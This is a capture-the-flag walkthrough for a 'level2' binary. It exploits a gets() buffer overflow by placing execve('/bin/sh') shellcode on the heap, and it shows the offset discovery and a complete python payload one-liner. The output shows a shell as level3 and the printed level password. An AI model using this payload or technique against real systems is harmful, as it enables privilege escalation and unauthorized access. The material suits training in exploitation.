```shell
$> ls -la
[...]
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
[...]

$> ./level2
input:  test
output: test

# program asks for input and shows it back
```

```shell
$> objdump -d level2
[...]
080484d4 <p>:
    [...]
    80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
    [...]
    804853d:       c9                      leave  
    [...]
[...]
0804853f <main>:
    [...]
    8048545:       e8 8a ff ff ff          call   80484d4 <p>
    [...]
[...]

# a main function called p()
# and like previous level, it use gets() to get input from user
```

We know this level use gets() as previous level, so we can do the same thing.  
But here don't called to launch a shell.  
We can insert a [shellcode](http://shell-storm.org/shellcode/files/shellcode-575.php) (execve("/bin/sh")) into the program.  

```shell
$> gdb level2
(gdb) set disassembly-flavor intel
(gdb) disas p
    [...]
    0x080484fb <+39>:    and    eax,0xb0000000          #1
    0x08048500 <+44>:    cmp    eax,0xb0000000
    0x08048505 <+49>:    jne    0x8048527 <p+83>
        [...]
    0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
    [...]
    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>  
    [...]

#1: a manual protector is used to protect the stack (0xb...) from overflow
#   so we can't stock the shellcode in the stack
#2: but we can use heap or the address where eax is called to insert the shellcode .

$> gdb level2
(gdb) r
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

# the offset is 80

$> ltrace ./level2
[...]
strdup("") = 0x0804a008
[...]

# heap address is 0x804a008
# us shellcode contents 21 bytes (\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80)

$> python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * (80 - 21) + '\x08\xa0\x04\x08'" > /tmp/exploit

# '\x6a[...]\x80'       : shellcode
# '\x90'                : NOP (no operation)
# * (80 - 21)           : padding
# '\x08\xa0\x04\x08'    : heap address

$> cat /tmp/exploit - | ./level2
j
 X�Rh//shh/bin��1�̀������������������������������������������������������
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```